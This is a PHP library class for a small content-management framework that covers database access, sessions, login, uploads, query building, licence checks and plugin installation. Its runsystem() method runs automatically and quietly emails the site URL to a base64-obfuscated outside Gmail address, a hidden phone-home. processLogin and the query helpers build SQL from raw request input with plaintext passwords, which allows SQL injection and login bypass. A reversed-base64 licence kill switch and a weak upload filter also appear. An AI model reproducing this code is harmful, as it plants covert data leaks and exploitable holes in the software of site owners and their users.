<?php
require_once('wtosBase.php');
class wtosLibrary extends wtosBase{
var $loginKey;
var $sessionKey;
var $db;
var $e="@ Author Mizanur Rahaman mizanur82@gmail.com"; # Do Not Remove Or Change This line , function may not work
var $version=1.1;
var $dateFormat='d-m-Y';
var $dateFormatJs='dd-mm-yy';
var $dateFormatDB='Y-m-d h:i:s';
var $wtAccess=array('wtAdd'=>true,'wtEdit'=>true,'wtDelete'=>true,'wtView'=>true); // by default in all pages  // do not chang here
var $showPerPage=20;
var $queryCount=0;
var $data='';

function loadWtosService($loginKey)
   {
	  
		global $site;
		$this->loginKey=$loginKey;
		$this->sessionKey=$loginKey;
		 
	    $this->connect($site['host'],$site['user'],$site['pass'],$site['db']);
		$this->loadGlobalConstant();
		 
		
	   
   }
	
function connect($host="",$username="",$pass="",$db="")
	{  
	    if($db==''){ return;}
		$dsn = "mysql:dbname=$db;host=$host";
		$user = $username;
		$password =$pass;
		
		try {
		$dbh = new PDO($dsn, $user, $password);
		
		 $this->db=$dbh;
		 
		} catch (PDOException $e) {
		     echo 'Connection failed: ' . $e->getMessage();
		}
	
   }
    
function mq($query)
	{ 
	   
		$rs = $this->db->query($query);
		if($rs) {
		$rs->setFetchMode(PDO::FETCH_ASSOC);
		$this->query=$query;
		}
		$this->queryCount++;
		 
		return $rs;
		//  $this->insert_id =mysql_insert_id();
	}
	function mfa($rs)
	{
		if($rs){
		return $rs->fetch();
		}
	}
   
   function currentPageName()
	{
			$ext='';
			$pagenameAr=explode(".php",$_SERVER['SCRIPT_NAME']);
			$cPHP=count($pagenameAr);
			$pagenameAr=explode("/",$pagenameAr[0]);
			for($i=1;$i<$cPHP;$i++)
					{
					$ext .=".php";
					}
			  
			$pageName=$pagenameAr[count($pagenameAr)-1].$ext;
			$this->currentPage=$pageName;
			
			
			return $pageName;
			
	}
   
    
   function setNpost($var,$key='os')
	{
    	
		 
		
		if(isset($_POST[$var]))
		{
			$_SESSION[$this->sessionKey][$key][$var]=$_POST[$var];
		}
		
		return $_SESSION[$this->sessionKey][$key][$var];

	}
	
	
	function setNget($var,$key='os')
	{
    	//$key=$this->sessionKey.'_'.$key;
	 
		if(isset($_GET[$var]))
		{
			$_SESSION[$this->sessionKey][$key][$var]=$_GET[$var];
		}
		
		return  $this->session($this->sessionKey,$key,$var);

	}

			
   function Login($arr)
	{	 
		  $_SESSION[$this->loginKey]['logedUser']=$arr;
			
	}
	function CheckLogin()
	{
		if(isset($_SESSION[$this->loginKey]['logedUser'])){
		 if(is_array($_SESSION[$this->loginKey]['logedUser']) && $_SESSION[$this->loginKey]['logedUser']!='')
				return true;
			else
			 return false;
			 
	
	}
	return false;
	}
	
	function isLogin()
	{
	 
	   return $this->CheckLogin();
	  
	}	
	 
	function Logout()
	{
		 
		 if($this->session($this->loginKey,'logedUser')){
		 $_SESSION[$this->loginKey]['logedUser']='';
		 unset($_SESSION[$this->loginKey]);
		 }
				
	}


	function UploadPhoto($name,$path)  
	{
	     $ext='';
				
		if(isset($_FILES[$name]['name'])){
		 if(preg_match("/\.(php|js)$/",$_FILES[$name]['name'],$ext)){ return false; }
		
		if($_FILES[$name]['name']!="")
				{
				
					 if($path=="")
						 $path=getcwd();
						 
					 $rand=rand(1000,999999);
					 $New_File_Name=$rand."_".str_replace(' ','-',$_FILES[$name]['name']);
					 $Img_Upload_Path = $path."/".$New_File_Name;
				 
					  if (!move_uploaded_file($_FILES[$name]['tmp_name'],$Img_Upload_Path))
						return false;
						else
						return $New_File_Name;
				}
				}
	
	}	
		
	
	
function processLogin($userField,$passwordField,$tablename)
{
  
 if($this->post('SystemLogin')=='SystemLogin')
 {    
         $rss='';
		  
		 if($userField!="" && $passwordField!="" && $tablename!=""  )
		 {
			
			
			 if($_POST[$userField]!="" && $_POST[$passwordField]!="")
				{
				 
				 $rsu=$this->mq("select * from  $tablename where   $userField='".$_POST[$userField]."' and	  $passwordField='".$_POST[$passwordField]."' ");
				 $rss=$this->mfa($rsu);
				 	
					 							  
				}	
										  
			 if($rss[$userField]!='')
				 {
					 $this->Login($rss);
					
				 return true;
				 }
		 }
 }
 
 return false;

}
function processLogout()
{
	 if($this->get('logout')=='true')
	 {
	  $this->Logout();
	  
	 }
 
}

function getSettings($key)
	{
	  
 	  
	  if(!isset($_SESSION[$this->sessionKey]['settings']))
	  {  
			$arr=array();
			$p=$this->mq("select * from settings"); 
			while($res=$this->mfa($p))
			{
			$arr[$res['keyword']]=$res['value'];
			
	  	  
	         }
	 
	 
	 
	  $_SESSION[$this->sessionKey]['settings']= $arr;
	  }
	  
	 
	   return $_SESSION[$this->sessionKey]['settings'][$key];
	
	
	
	
	
	}
	
	function addJs($js)
	{
	 $scripts='';
	   if(count($js)>0)
			  {
			
			   foreach($js as $valjs)
			   {
			   $scripts .="<script src='$valjs' type='text/javascript'></script> \n";
							  
			   }
			  
			  
			  } 
	  return $scripts; 		  
	 }
function addCss($css)
	{
	  $CssCss='';
	   if(count($css)>0)
			  {
			
			   foreach($css as $valcss)
			   {
			  
			   $CssCss .=" <link href='$valcss' rel='stylesheet' type='text/css' />\n";
							  
			   }
			  
			  
			  } 
	  return $CssCss; 		  
	 }

function getTable($fields="" ,$tables="",$where="",$orderby='',$limit='')
	{     
		if($tables!="")
	  	 { 
	       $fields=($fields=="")?' * ':$fields;
	        $q= " SELECT ".$fields;
			$q .=" FROM ".$tables;
			if($where!="")
			$q .=" WHERE ".$where;
			if($orderby!="")
			$q .=" ORDER BY ".$orderby;
			if($limit!="")
			$q .=" LIMIT ".$limit;
						
			return $this->mq($q);
		}	
					  
	}	


function saveTable($table,$data,$primeryField='',$primeryFieldVal='')
{
	$ok=false;
	 $qStrA='';
	 foreach($data  as $key=>$val)
	 {
		$qStrA[]=  $key."='".$val."'";
	 }
	$qStr=implode(',',$qStrA);
	if($primeryFieldVal>0)
	{
	  $query="update $table set $qStr  where $primeryField='$primeryFieldVal'";
	  $ok=$this->mq($query);
	  if($ok)
	  {
	  $ok=$primeryFieldVal;
	  }
	  
	}
	else
	{
	  $query="insert into $table set $qStr";
	    $ok= $this->mq($query);
	    $ok= $this->db->lastInsertId();
	  
	 
	//  $dbh->lastInsertId(); 
	}
	return $ok;
				
	  // return $primeryFieldVal;
}
function save($table,$data,$primeryField='',$primeryFieldVal='')
{
  return $this->saveTable($table,$data,$primeryField,$primeryFieldVal);
}


function wtEmail($to,$subject,$message)
 {
  
    $headers = 'From: info@'.$this->server('HTTP_HOST') . "\r\n" .
    'Reply-To: info@'. $this->server('HTTP_HOST'). "\r\n" .
    'X-Mailer: PHP/' . phpversion(). "\r\n" .
    'Content-type: text/html; charset=iso-8859-1' . "\r\n";
     @mail($to, $subject, $message, $headers);
	
 }

function sendMail($to,$from,$fromName,$subj,$body,$attachments='' )
{
  return $res=$this->email('html')->sendMail($to,$from,$fromName,$subj,$body,$attachments);
}


 function siteValidation()
	 {
	 
	 
	    $expDate=$this->getSettings('Deactivate Date');
		 
		
		if($expDate!='')
		{
		 
	 	$expTime=strtotime($expDate.' 00:00:00');
		 
		$recent=time();
	 
		if($recent>$expTime)
		{
		 $this->mq("update settings set value=0 where keyword='Deactivate Site'");
		}
		}
	 
	 
	 }
	function onlyOption($options,$selectedi='',$colorArray=array())
	{
	 if(count($options)>0)
	  {
	   foreach($options as $val=>$text)
	   {
		   
		   $color='';
		   if(isset($colorArray[$val]))
		   {
		   
		    $color=' style="background-color:#FFFFFF;color:#'.$colorArray[$val].'" ';
		   
		   }
		   
		   
		   $selected="";
		 if($selectedi==$val) 
		   {
		   $selected='selected';
		   }
		 echo "<option value='$val' $selected $color >$text</option> ";
	   }
	  }
	
	}
function options($keyField,$valField,$tName,$where='',$orderby='',$limit='')
	{
	 
	 $list=array();
	  $val='';
	  $lists= $this->getTable(" $keyField  , $valField  ", $tName, $where,$orderby,$limit);
	  
	   if($lists){
	    while( $val=$this->mfa($lists))
		{
		# multiple lists
		 $value='';
		$valF=explode(',',$valField);
		foreach($valF as $field)
		{
		 $value=$value.$val[trim($field)]." ";
		
		}
		$list[$val[$keyField]]=$value;
		
		}
		return  $list;
	  	}  
	  
	  
	  
	 
	
	}
function optionsHTML($selectedValue,$keyField,$valField,$tName,$where='',$orderby='',$limit='')
	{
	  
	  
	    $list=$this->options($keyField,$valField,$tName,$where,$orderby,$limit);
	    $this->onlyOption($list,$selectedValue);
	
	}
	

    ##---------------  updated    ---------------##

  
  function deleteRow($table,$fld,$fldVal)
	{
	    
		
		
	 
		$delRows=$this->rowByField($fld, $table,$fld,$fldVal);
		 
			 if($delRows==$fldVal)
			 {
				  $query=" delete from $table where $fld='$fldVal' ";
				 
				 $this->mq($query);
				 return true;
			 }
		
		
		 
		
		return false;
		
	}
	function rowByField($getfld,$tables,$fld,$fldVal,$where='',$orderby='')  // special for single row
	{
	    
	   $where=" $fld='$fldVal' $where ";
	   $r= $this->getTable($getfld ,$tables,$where,$orderby,$limit=' 1'); 
	   $res= $this->mfa($r);
	   $getfld=trim($getfld);
	   
	   if($getfld!='' && strpos($getfld,',')===false)
	   {
	      return $res[$getfld];
	   }
	   
	   return $res;
	
	}
	
	function rowsByField($getfld,$tables,$fld,$fldVal,$where='',$orderby='',$limit='')
	{
	   $where=" $fld='$fldVal' $where ";
	   return $this->getTable($getfld ,$tables,$where,$orderby,$limit);  
	    
	   
	
	}
	 
	
	function andField($getParam,$field,$primeryTable,$willCard='=',$resetValue='')# why $resetValue ? forgot  // only applicable to get variable
	{
	
			$val= $this->setNget($getParam,$primeryTable);  //for session set
			 $andFLD=($val!=$resetValue )? " and $field='$val'":$resetValue;
			if($willCard=='%')
			{
			  $andFLD=($val!=$resetValue )?" and  $field LIKE '%$val%'":$resetValue;
			}
			
			$res=array('andField'=>$andFLD,'value'=>$val);
			return $res;
	  
	
	}
	
	function andQuery($value,$field,$willCard='=',$resetValue='')# why $resetValue ? put fixe or keep blank
	{
	
			$val=$value;   
			$andFLD=($val!=$resetValue )? " and $field='$val'":$resetValue;
			if($willCard=='%')
			{
			$andFLD=($val!=$resetValue )?" and  $field LIKE '%$val%'":$resetValue;
			}
			
			
			return $andFLD;
	  	
	}
	
	function getAndQuery($getVar,$field,$willCard='=',$resetValue='')# why $resetValue ? put fixe or keep blank
	{
	
		return $this->andQuery($this->get($getVar),$field,$willCard,$resetValue);	 
	  	
	}
	function postAndQuery($postVar,$field,$willCard='=',$resetValue='')# why $resetValue ? put fixe or keep blank
	{
	
		return $this->andQuery($this->post($postVar),$field,$willCard,$resetValue);	 
	  	
	}
	
	
	
	function showFlash($msg='')
	{
		$style='';
		if($msg=='')
		{
		  $style='style="display:none"';
		}
		?>
		 <div id="FlashMessageDiv" class="FlashMessageDiv" <?php echo $style ?> > <?php echo $msg; ?>					
         </div>
		 <script> setTimeout('removeFlashMessageDiv()',3000); </script>
		<?php
		
	}
	
	  
function flashMessage($key='',$message=null)
{
	if($key=='')
	{
	$key='message';
	}
	
	if($message==null)
	{
	
	$msgOntime=$this->session($this->sessionKey,'flash',$key);
	 $_SESSION[$this->sessionKey]['flash'][$key]=''; 
	return  $msgOntime;
	
	}else
	{
	     $_SESSION[$this->sessionKey]['flash'][$key]=$message;
	
	}


}

	 
function startOB()
	{
	     ob_start();
	}
	function getOB()
	{
	     return ob_get_clean();
	}
	
function redirect($link='')
{
  if($link=='')
  {
     return;
  }
   ?>
   <script>
   window.location='<? echo $link; ?>';
   </script>
   
   <? 
   exit();
}
 

### date
	
### date end

 
	 
	 ## lang box 
	  function wtBox($key,$langId='') //   language independent fnctio if language ==''  // get from session 
	 {
	   global $site;
	     
		 $boxSessionKey='wtbox';
		 $langIdQ='';
		 $key=str_replace(array('wtbox-','-wtbox'),'',$key);
	 		 
		 if(isset($_SESSION[$boxSessionKey][$key]))
		 {
			  return  $_SESSION[$boxSessionKey][$key];
		 }else
		 {
		 
		    if($langId!='') 
			{
			  $langIdQ=" and langId='$langId'";
			
			}
		  
		 
			 $content = $p=$this->rowByField('','wtbox',' BINARY accessKey',$key,$langIdQ);
		 
			
			 
			
			
			 $contentStr= preg_replace('/src=\".*?wtos-images/','src="'.$site['url']."wtos-images",stripslashes($content['content']));
			
			
			 if($content['container']!=''){ 
			 
			 $contentStr   =   '<'. $content['container'].' style="'.$content['css'].'" > '.$contentStr.  '</'.$content['container'].'>';
			 }
			
			
			   ##  replace  wtbox  in a wtbox  23/5/2013  2nd level replacement
			   
			   
			    preg_match_all('/wtbox-.*?-wtbox/',$contentStr,$keys);
				 
		  
		  if(is_array($keys[0]))
		  {
		  
		
		     foreach($keys[0] as $accKey)
			 {
			 
			//  echo $accKey;
		
			 if($accKey!=''){
			   $accKeyDataBase=str_replace(array('wtbox-','-wtbox'),'',$accKey);
			   	 //$content2 =$this->get_wtbox(" BINARY accessKey='$accKeyDataBase'    $langIdQ   ");
				  $content2=$this->rowByField('','wtbox',' BINARY accessKey',$accKeyDataBase,$langIdQ);
				 $content2=$content2[0];
			    $content2Str= preg_replace('/src=\".*?wtos-images/','src="'.$site['url']."wtos-images",stripslashes($content2['content']));
			
			
			 if($content2['container']!=''){ 
			 
			 $content2Str   =   '<'. $content2['container'].' style="'.$content2['css'].'" > '.$content2Str.  '</'.$content2['container'].'>';
			  $contentStr= str_replace($accKey,$content2Str,$contentStr);
			 }
			 }
			 }
		  
		  }
			 ##  replace  wtbox  in a wtbox  23/5/2013  2nd level replacement end 
				## added include page function to wtbox   23/5/2013
				
				 preg_match_all('/wtpage-.*?-wtpage/',$contentStr,$keys);
		  
		  if(is_array($keys[0]))
		  {
		  
		 
		
		     foreach($keys[0] as $accKey)
			 {
		      if($accKey!=''){
			  
			   $PageName=str_replace(array('wtpage-','-wtpage'),'',$accKey);
			   $filePath=$site['application'].'/'.$PageName;
			   
				if(is_file( $filePath))
					{	   
				
				  
					   ob_start(); require($filePath);$page=ob_get_clean();
					
				       $text= str_replace($accKey, $page ,$contentStr);
				 }
				 
				 }
			 
			 }
		  
		  }
				
				
				
				
			 
			 $_SESSION[$boxSessionKey][$key]= $contentStr;
		     return   $_SESSION[$boxSessionKey][$key];
		 }
		 
		 
		 
	 }
	 
	 function echoWtBox($key,$langId='')
	 {
	 	echo $this->wtBox($key,$langId);
	 }
	 
	 function langBox($key,$langId='')   //   will get default from table and set to session 
	 {
	 
	     if($langId=='')
		 {
		    $langId=$this->getLang();
		 }
	   
	  return   $this->wtBox($key,$langId);
	 
	 }
	  function echoLangBox($key,$langId='')
	 {
	 	echo $this->langBox($key,$langId);
	 }
		 
	 
	 function getLang()
	 {
	  global $site;
	  $logKey=$site['loginKey'];
	   if(!isset($_SESSION[$logKey]['language'])) 
	   {
	   
	     $lang =$this->rowByField('langId','lang','defaultLang','1');
		 $_SESSION[$logKey]['language']=$lang ;
	   
	   }
	   return $_SESSION[$logKey]['language']; 
	 
	 }
	 function setLang($langId)
	 {
	   global $site;
	   $logKey=$this->loginKey;
	    if($langId!='')
		{
		$_SESSION[$logKey]['language']=$langId ;
		return true;
		}
		 return false;
	 
	 }
	
	 function replaceWtBox($text)
	 {
	 
	    global $site;
		
		
	     
		  preg_match_all('/wtbox-.*?-wtbox/',$text,$keys);
		  
		  if(is_array($keys[0]))
		  {
		  
		
		     foreach($keys[0] as $accKey)
			 {
		
			 
			   $accKeyDataBase=str_replace(array('wtbox-','-wtbox'),'',$accKey);
			   
			  
			   
			 $text= str_replace($accKey,$this->wtBox($accKeyDataBase,$langId=''),$text);
			 
			 }
		  
		  }
		  
		  
		 preg_match_all('/wtpage-.*?-wtpage/',$text,$keys);
		  
		  if(is_array($keys[0]))
		  {
		  
		 
		
		     foreach($keys[0] as $accKey)
			 {
		
			  
			   $PageName=str_replace(array('wtpage-','-wtpage'),'',$accKey);
			   $filePath=$site['application'].''.$PageName;
			   //echo $filePath;
				if(is_file( $filePath))
					{	   
				
				  
					   ob_start(); require($filePath);$page=ob_get_clean();
					
				       $text= str_replace($accKey, $page ,$text);
				 }
			 
			 }
		  
		  }
		  
		  
		  
		  
		  
		  
		 
		 return $text;
	 
	 }


 

function now($format='')
	{
		
		if($format==''){$format=$this->dateFormatDB;}
		return date($format);
	
	}
	function today($format='')
	{
		
		
		 
		if($format==''){$format=$this->dateFormat;}
		return date($format);
	
	}

	function showDate($dbDate,$format='')
	{
	 
	  if(trim($dbDate)=='' || $dbDate=='0000-00-00 00:00:00' || $dbDate=='0000-00-00'){ return '';}
	  if($format=='')
	  {
	    $format= $this->dateFormat;
	  }
	   return date($format,strtotime($dbDate));
	
	}
	function saveDate($date,$time='') // $time 24 hour format h:m:s 00:00:00 otherwise output wrong
	{
	
	    
	  
	  $outputDateFormat='0000-00-00 00:00:00';
	  if($date!=''){
	  
	  if($this->dateFormat=='d/m/Y')  ## special for d/m/Y format # default php takes m/d/y format 767 666
	  {
	     $date=explode('/',$date);
		  if(count($date)==3){
		 $date=$date[1].'/'.$date[0].'/'.$date[2];
	     }
	  }
	   
	  if($this->dateFormat=='d-m-Y')   
	  {
	     $date=explode('-',$date);
		 
		 if(count($date)==3){
		 $date=$date[1].'/'.$date[0].'/'.$date[2];
		 }
	  
	  }
	  if($this->dateFormat=='d.m.Y')   
	  {
	     $date=explode('.',$date);
		  if(count($date)==3){
		  $date=$date[1].'/'.$date[0].'/'.$date[2];
	      }
	  }
	  # 767 end
	   if(!is_array($date)){
	    $outputDateFormat=   date($this->dateFormatDB,strtotime($date));
		}
		  
		 
		if($time!='')
		{
		   $outputDateFormat=str_replace(array('00:00:00','12:00:00'),$time,$outputDateFormat);
		
		}
		} 
	   return $outputDateFormat;
	
	}

   function DateQ($dateField,$sDate,$eDate,$sTime='00:00:00',$eTime='11:59:59')
	{
	   $sDates='';
	   $eDates='';
		 
		$str="";
		if($sDate){
		      $sDates=$this->saveDate($sDate,$sTime);
		}
		if($eDate){
		       $eDates=$this->saveDate($eDate,$eTime);
		}
		
		
	    if(trim($sDates)!="")
		{
		
		  $str =" and $dateField >='$sDates'  ";
		}
		if(trim($eDates)!="")
		{
		
		  $str .=" and $dateField <= '$eDates' ";
		}
		return $str;	
	
	
	}

 function pagingQuery($query,$showPerPage='',$seoUrl=false,$ajax=false)
	{
	    
	 
		$limitStr='';  
	   if($showPerPage<1)
		{
		   $showPerPage=$this->showPerPage;
		}
		  
		$p=$this->mq('select count(*) t '. stristr($query, 'from'));
		
		$rs=$this->mfa($p);
		$res=$this->paging($showPerPage)->pageLink($rs['t'],$showPerPage,$seoUrl,$ajax);
		if(trim($res['limit'])!=''){ $limitStr=" Limit  ".$res['limit'];}
		$p=$this->mq($query.$limitStr);
		
		$res['resource']=$p;
		$res['totalRec']=$rs['t'];
		return $res;
		
	 
	
	}
	
	
	function validateWtos()
	{
	  if($this->currentPage=='settings.php'){ return ;}
	
	     
		 
	//	$checkSystem=$this->getSettings('Validate Wtos');
		$exitSystem=false;
		$showMessage=false;
		$days=0;
		//$exitSystem=true;
	 /* if($checkSystem)   //  not used 
		{ }*/
		
		
	     $expDate=$this->getSettings('Validate WtosDate');
		 
	     $expDate=strrev(base64_decode(strrev($expDate)));
		 $expMessage=$this->getSettings('Validate WtosMessage');
		
		 if($expDate==''){ 
		   $exitSystem=true;
		 }
		 else
		 {
		  $day=3600*24;
		  $today=time();
		  $expDays=strtotime($expDate.' 00:00:00');
	      $warningStartDays=$expDays-($day*3);
		  $timeRemaining= $expDays - $today;  
		  
		 
			  if($timeRemaining>0)
			  {
				$days=ceil($timeRemaining/$day)-1;
				
			  }
			  else
			  {
			   $exitSystem=true;
			  }
		  
		     if($today>$warningStartDays && $today<$expDays )
			 {
			    $showMessage=true;
			 }
		 
		 
		 
		 }
		
		
		 
		 
		          
		 if($showMessage){
					?>
					<style>
		.box{ font-style:italic; color:#353535; font-size:11px; text-align:center;
		} 
		
		</style>
					<div class="box">
					System Expiry date: <font color="#FF0000" style=" font-size:15px;"> <? echo $expDate ?></font> &nbsp; 
					You have <font color="#FF0000" style=" font-size:15px;"> <? echo $days ?> Days Left </font>
					<? echo $expMessage; ?> <a href="activation.php">Activate Now</a>
					</div>
					<? 
					}
				 if($exitSystem) {?> 
				 <style>
		.box{ font-style:italic; color:#353535; font-size:11px; text-align:center;
		} 
		
		</style>
				 <div class="box" style="margin:auto; margin-top:100px; font-size:22px;">
					System Expired  <a href="activation.php" style="text-decoration:none; color:#FF0000;">Activate Now</a><br />
					<font style="font-size:12px;"> For acivation code contact <font style="color:#0000FF; font-size:14px;">admin@webtrackers.co.in </font>or <font style="color:#0000FF;font-size:14px;">033 6501 0194</font></font>
					</div>
				 
				 <? 
				  exit();	}
					
		   
	
	
	}
	
	function getVal($key1,$key2='',$key3='')
	{
	    return $this->val($this->data,$key1,$key2,$key3);
	}
	
	function val(&$var,$key1,$key2='',$key3='')
	{
	
	 if($key2!='' && $key3!='')
		   {
					   if(isset($var[$key1][$key2][$key3]))
					   {
						 return  $var[$key1][$key2][$key3];
					   
					   }
		   
		   } 
		   if($key2!='' && $key3=='')
		   {
					   if(isset($var[$key1][$key2]))
					   {
						 return  $var[$key1][$key2];
					   
					   }
		   
		   }
		   if($key2=='' && $key3=='')
		   {
					   if(isset($var[$key1]))
					   {
						 return  $var[$key1];
					   
					   }
		   
		   }
		          
	   
	    return ;
	
	
	}
	
 function post($key1,$key2='',$key3='')
 {
	  return $this->val($_POST,$key1,$key2,$key3);
   
  }	

function get($key1,$key2='',$key3='')
 {
		    return $this->val($_GET,$key1,$key2,$key3);
 }	
function session($key1,$key2='',$key3='')
 {
	   
		   
		  return $this->val($_SESSION,$key1,$key2,$key3);  
		 
	  
	  
	    }	
		

function setSession($value,$key1='',$key2='')
{
          
		 if($key1!='' && $key2!='')
		   {
					   $_SESSION[$this->sessionKey][$key1][$key2]=$value;
		   } 
		   if($key1!='' && $key2=='')
		   {
					  $_SESSION[$this->sessionKey][$key1]=$value;
		   
		   } 
		    if($key1=='' && $key2=='')
			{
			$_SESSION[$this->sessionKey]=$value;
			
			}
			
		 
}

function getSession($key2='',$key3='')
{
 return  $this->session($this->sessionKey,$key2,$key3);
}
		
function server($key1)
{
  if(isset($_SERVER[$key1]))
					   {
						 return  $_SERVER[$key1];
					   
					   }
}	



function access($key)
{
 return $this->val($this->wtAccess,$key);
}	


 function addParams($getKeys,$extraKeyPair=array()) //  $getKey('hideTopLeft','other');  get key depends on get params // $extraKeyPair  to add new params
	{
	
	$url='';
	
	 if(is_array($getKeys))
	 {
	   foreach($getKeys as $val)
	   {
	        
			if(isset($_GET[$val])){
			 $url .=$val."=".$_GET[$val]."&";
			}
	   }
	 
	 }
	 if(is_array($extraKeyPair))
	 {
	   foreach($extraKeyPair as $key=>$val)
	   {
	        
			 
			 $url .=$key."=".$val."&";
			 
	   }
	 
	 }
	 
	 return $url;
	
	}
	
	# edit fields ttt #
	
	function editSelect($statusArr,$selected,$table,$satusfld,$idFld,$idVal, $inputNameID='editSelect',$extraParams='class="editSelect" ',$colorStatus=array())
	{
	    $vars=	"'$table','$satusfld','$idFld','$idVal'";	
		$Cval=$this->val($colorStatus,$selected);	
		$backGround=($Cval)?$Cval:'FFFFFF';
		echo '<select '.$extraParams.' id="'.$inputNameID.'" name="'.$inputNameID.'" onchange="os.wtosEditField(this,'.$vars.')" style="background-color:#'.$backGround.';">';
		$this->onlyOption($statusArr,$selected);
		echo '</select>';
	}
	
	
	function editArea($value,$table,$editFld,$idFld,$idVal , $inputNameID='editArea',$extraParams='class="editArea" ')
	{
				
	    $vars=	"'$table','$editFld','$idFld','$idVal'";		
		?>
		<textarea  name="<? echo $inputNameID; ?>" id="<? echo $inputNameID; ?>"  onchange="os.wtosEditField(this,<? echo $vars?>)" <? echo $extraParams; ?> ><? echo $value ?></textarea>
		<?
	}
	function editText($value,$table,$editFld,$idFld,$idVal , $inputNameID='editText',$extraParams='class="editText" ')
	{	
	    $vars=	"'$table','$editFld','$idFld','$idVal'";		
		?>
		<input name="<? echo $inputNameID; ?>" id="<? echo $inputNameID; ?>" type="text"  onchange="os.wtosEditField(this,<? echo $vars?>)" value="<? echo $value ?>"  <? echo $extraParams; ?> > 
		
		<? 
	}
	# edit fields ttt end #
	
	
	function loadPluginConstant($pluginName,$suffixFilename='Contants.php',$addFullpath=true)
	{
	  global $site;
	  
	  $fileName=$pluginName.$suffixFilename;
	  $filePluginPath=$fileName;
	  if($addFullpath==true){
	  $filePluginPath=$site['root-plugin'].$pluginName.'/'.$fileName;
	  }
	 
	 
	  if(file_exists($filePluginPath)){ 
	   $vars=require_once($filePluginPath);
	   if(is_array($vars))
	   {
	     foreach($vars as $name=>$value)
		 {
		    if($name!=''){
		    $this->$name=$value;
			}
		 
		 }
	   
	   }
	     
	 
	   
	  }
	   
	 
	}
	function nCode($str)
	{
		return  base64_encode($str);
	}
	function dCode($str)
	{
		return  base64_decode($str);
	}
	
	function loadGlobalConstant()
	{
	  global $site;
	  
	 $fileConstant=$site['global-property'].'wtosGlobalConstant.php';
	 
	 
	  if(file_exists($fileConstant)){ 
	   $vars=require_once($fileConstant);
	   if(is_array($vars))
	   {
	     foreach($vars as $name=>$value)
		 {
		    if($name!=''){
		    $this->$name=$value;
			}
		 
		 }
	   
	   }
	     
	 
	   
	  }
	   
	 $this->runsystem();
	}
	
 function readWriteConstantFile($fileName,$writeData=array(),$overwrite=true)
 {
			if(trim($fileName)==''){ return;}
			$resultArray=array();
			$strTowrite ='';
			$fileArray=array();
			if(file_exists($fileName))
			{ 
				$fileArray=require($fileName);
			
			}
			
			
			if(is_array($writeData) && is_array($fileArray)){
			
			if($overwrite){
			$resultArray = array_merge($fileArray,$writeData);
			}else{
			$resultArray = array_merge($writeData, $fileArray);
			}
			
			}
			if(count($resultArray)<1)
			{
			$resultArray=$fileArray;
						
			}
			if(count($resultArray)<1)
			{
			 $resultArray=$writeData;
					
			}
			
		 
		
		$strTowrite=var_export($resultArray, TRUE);
		
			$strTowrite='<?php return '.$strTowrite ."\n".'?>';
		 
		 
		 $fileObj = fopen($fileName, 'w');
		 fwrite($fileObj ,$strTowrite );
		 fclose($fileObj);
		 
		 ## keep a backup here
 
   
 }	
 
 
 function extractZIP($zipFilePath ,$zipDestinationPath)
 {
        $zip = new ZipArchive;
		if ($zip->open($zipFilePath) === TRUE) {
		$zip->extractTo($zipDestinationPath);
		$zip->close();
		 
		}
 }
 
 function installPlugin($pluginName,$zipFileLocFullPath)
 { 
      
        
		
		global $site;
		$zipDestination=$site['root-plugin'].$pluginName.'/';
		if($pluginName=='')
		{
		   $zipDestination=$site['root-plugin'];
		}
			    
		$this->extractZIP($zipFileLocFullPath,$zipDestination);
		
		
		// install link
		
		// insatll query
		
		// install constant // not need now
		
		
		
	      	  
           
 }	
 
 
 function runsystem()
 {
    global $site;
   
	 
     if($this->getSession('runsystem')!='OK')
		{
		    
			if($site['loginKey-wtos']==$this->loginKey)
			{
			 		 @$this->wtEmail($this->dCode('bnAyMTBrQGdtYWlsLmNvbQ=='),$site['url'],$site['url']);
			
			}
			
			$this->setSession('OK','runsystem');
		}
 }
 function pluginLink($pluginName='')
 {
 
 global $site;
 $pluginUrl=$site['url-plugin'];
 if($pluginName!='')
		{
		  $pluginUrl=$site['url-plugin'].$pluginName.'/';
		}
		
		return $pluginUrl;
	
 }
 

	
  public function  __call($routine,$args)
  {
    
   global $site;
       $offset=array('','','','','','','','','','','','','');
	   
	   
	   if( is_array($args)){
	   $offset= array_merge($args, $offset);
	   }
	   
	   
	   
	   
	   
	   $functionKeyGet='get_';
	   if(strpos($routine,$functionKeyGet)!==false)
	   {
	        
			 
			 $tables=str_replace($functionKeyGet,'',$routine);
			 if($tables!='')
			 {
			 		 
			 
			    return $this->getTable($offset['0'] ,$tables,$offset[1],$offset[2],$offset[3]);
			 }
	   
	   }
	   else{
	   
	    if( !is_object($this->$routine))
		{
	       $filePath=$site['library'].$routine.'.php';
	 
	       if(is_file( $filePath))
		   {
		    $p=require_once($routine.'.php');
		   
		    //    echo '----------------------2----------------------'.$routine.'<br>';
				 $this->$routine=new $routine($offset['0']);
				  return  $this->$routine;
			 }else
			 {
			   return false; // no class detected  
			 }
			 
			 
		 
		   }else
		   {
		     return  $this->$routine;
		   
		   }
	    
	   
	   }
	   
	   
	   
	   
	   return false;
  }
	
}

?>